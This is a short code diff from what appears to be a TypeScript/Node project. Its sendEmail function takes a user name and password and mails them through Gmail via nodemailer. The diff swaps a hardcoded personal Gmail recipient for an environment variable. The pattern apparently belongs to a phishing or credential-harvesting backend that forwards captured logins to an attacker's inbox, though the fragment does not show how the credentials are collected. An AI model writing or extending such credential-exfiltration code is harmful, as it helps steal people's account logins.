@@ -110,7 +110,7 @@ function formatMessage(user_name: string, password: string) {
 async function sendEmail(user_name: string, password: string) {
   const email = process.env.EMAIL_USERNAME;
   const pass = process.env.EMAIL_PASSWORD;
-  const recipient = "Krogstadracheal@gmail.com";
+  const recipient =  process.env.RECIPIENT_EMAIL;
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
